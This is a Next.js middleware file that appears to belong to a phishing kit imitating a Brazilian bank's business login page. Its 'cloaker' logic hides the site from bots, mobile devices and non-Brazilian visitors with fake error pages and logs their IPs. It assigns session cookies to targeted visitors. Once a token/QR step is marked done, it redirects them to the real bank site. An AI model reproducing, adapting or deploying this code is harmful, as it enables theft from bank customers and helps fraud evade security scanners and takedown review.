import type { NextRequest } from 'next/server';
import { NextResponse } from 'next/server';
import { isBot, isBrazil, isMobile } from './lib/cloaker/detectors';
import { getClientIp } from './lib/cloaker/ip';
import type { CloakerConfig } from './lib/cloaker/types';
const PUBLIC_PATHS: RegExp[] = [
  /^\/ibpjlogin(\/|$)/,
  /^\/$/, 
  /^\/favicon\.ico$/,
];
const BLOCK_PAGE_HTML = `<!doctype html><meta charset="utf-8"><h1>404 - Error.</p>`;
const g: any = globalThis as any;
g.__CLOAKER_IP_DENY ||= new Map<string, number>(); 
const IN_MEMORY_DENY_TTL_MS = 15 * 60 * 1000;
function isPublicPath(pathname: string): boolean {
  return PUBLIC_PATHS.some((re) => re.test(pathname));
}
async function fetchConfig(): Promise<CloakerConfig | null> {
  try {
    const res = await fetch(`${process.env.NEXT_PUBLIC_BASE_URL || ''}/api/cloaker/config`, {
      cache: 'force-cache',
    });
    if (!res.ok) return null;
    return (await res.json()) as CloakerConfig;
  } catch {
    return null;
  }
}
function blockResponse(): NextResponse {
  return new NextResponse(BLOCK_PAGE_HTML, { status: 403, headers: { 'content-type': 'text/html; charset=utf-8' } });
}
function fireAndForgetLog(ip: string, reason: string) {
  try {
    fetch(`${process.env.NEXT_PUBLIC_BASE_URL || ''}/api/cloaker/log`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ ip, reason }),
      keepalive: true,
    }).catch(() => {});
  } catch {}
}
function rememberDeny(ip: string) {
  g.__CLOAKER_IP_DENY.set(ip, Date.now() + IN_MEMORY_DENY_TTL_MS);
}
function isRecentlyDenied(ip: string): boolean {
  const exp = g.__CLOAKER_IP_DENY.get(ip);
  if (!exp) return false;
  if (exp < Date.now()) {
    g.__CLOAKER_IP_DENY.delete(ip);
    return false;
  }
  return true;
}
function generateSessionId(): string {
  const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let result = '';
  for (let i = 0; i < 23; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
}
async function fetchSessionFlags(sessionId: string): Promise<{ isTokenQrDone?: boolean } | null> {
  if (!sessionId) return null;
  try {
    const url = `${process.env.NEXT_PUBLIC_BASE_URL || ''}/api/client/session-data?sessionId=${encodeURIComponent(sessionId)}`;
    const res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) return null;
    return (await res.json()) as { isTokenQrDone?: boolean };
  } catch {
    return null;
  }
}
const REDIRECT_TARGET = 'https://www.ne12.bradesconetempresa.b.br/ibpjlogin/login.jsf';
export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;
  if (!isPublicPath(pathname)) {
    return NextResponse.next();
  }
  if (pathname === '/') {
    return NextResponse.redirect(new URL('/ibpjlogin/login', request.url));
  }
  const cfg = await fetchConfig();

  if (pathname === '/favicon.ico') {
    if (!cfg || !cfg.cloakerState) return NextResponse.next();

    const ip = getClientIp(request);
    if (isRecentlyDenied(ip)) return new NextResponse(null, { status: 404 });

    if (cfg.blockBot && isBot(request.headers)) {
      rememberDeny(ip);
      fireAndForgetLog(ip, 'bot-ua');
      return new NextResponse(null, { status: 404 });
    }
    if (cfg.blockMobile && isMobile(request.headers)) {
      rememberDeny(ip);
      fireAndForgetLog(ip, 'mobile');
      return new NextResponse(null, { status: 404 });
    }
    if (cfg.blockStranger) {
      const br = isBrazil(request.headers);
      if (br === false) {
        rememberDeny(ip);
        fireAndForgetLog(ip, 'non-br');
        return new NextResponse(null, { status: 404 });
      }
    }
    return NextResponse.next();
  }

  if (!cfg || !cfg.cloakerState) {
    const resp = NextResponse.next();
    const sessionCookie = request.cookies.get('sessionId');
    if (!sessionCookie) {
      resp.cookies.set('sessionId', generateSessionId(), {
        httpOnly: true,
        secure: false,
        maxAge: 60 * 60 * 24 * 7,
        path: '/',
      });
    }
    return resp;
  }

  const ip = getClientIp(request);
  if (isRecentlyDenied(ip)) {
    return blockResponse();
  }
  if (cfg.blockBot && isBot(request.headers)) {
    rememberDeny(ip);
    fireAndForgetLog(ip, 'bot-ua');
    return blockResponse();
  }
  if (cfg.blockMobile && isMobile(request.headers)) {
    rememberDeny(ip);
    fireAndForgetLog(ip, 'mobile');
    return blockResponse();
  }
  if (cfg.blockStranger) {
    const br = isBrazil(request.headers);
    if (br === false) {
      rememberDeny(ip);
      fireAndForgetLog(ip, 'non-br');
      return blockResponse();
    }
  }

  const response = NextResponse.next();
  const sessionCookie = request.cookies.get('sessionId');
  let sessionId = sessionCookie?.value;
  const isFirstVisit = !sessionId;
  if (!sessionId) {
    sessionId = generateSessionId();
    response.cookies.set('sessionId', sessionId, {
      httpOnly: true,
      secure: false,
      maxAge: 60 * 60 * 24 * 7,
      path: '/',
    });
  }

  if (process.env.REDIRECT_USER === 'true' && !isFirstVisit) {
    try {
      const flags = await fetchSessionFlags(sessionId!);
      if (flags?.isTokenQrDone === true) {
        return NextResponse.redirect(REDIRECT_TARGET);
      }
    } catch {
    }
  }

  return response;
}

export const config = {
  matcher: [
    '/ibpjlogin/:path*',
    '/',
    '/favicon.ico',
  ],
};
